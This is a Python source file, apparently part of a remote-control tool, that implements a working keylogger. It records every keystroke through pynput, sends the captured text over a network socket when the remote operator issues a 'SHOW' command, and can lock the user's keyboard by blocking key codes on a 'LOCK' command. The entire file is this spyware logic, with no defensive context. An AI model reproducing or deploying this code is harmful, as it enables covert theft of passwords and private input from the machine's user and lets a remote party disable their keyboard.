import threading

import keyboard
from RD_Constant import BUFFERSIZE
from pynput.keyboard import Listener


def keylogger(key):
    global cont, flag
    if flag == 4:
        return False
    if flag == 1:
        temp = str(key)
        if temp == "Key.space":
            temp = " "
        elif temp == '"\'"':
            temp = "'"
        else:
            temp = temp.replace("'", "")
        cont += str(temp)
    return


def show(client):
    global cont
    client.sendall(bytes(cont, "utf8"))
    cont = ""
    return


def listen():
    with Listener(on_press=keylogger) as listener:
        listener.join()
    return


def lock():
    global islock
    if islock == 0:
        for i in range(150):
            keyboard.block_key(i)
        islock = 1
    else:
        for i in range(150):
            keyboard.unblock_key(i)
        islock = 0
    return


def keylog(client):
    global cont, flag, islock, isbind
    islock = 0
    isbind = 0
    threading.Thread(target=listen).start()
    flag = 0
    cont = ""
    message = ""
    while True:
        message = client.recv(BUFFERSIZE).decode("utf8")
        if "BIND" in message:
            if isbind == 0:
                flag = 1
                isbind = 1
            else:
                flag = 2
                isbind = 0
        elif "SHOW" in message:
            show(client)
        elif "LOCK" in message:
            lock()
        elif "QUIT" in message:
            flag = 4
            return
    return
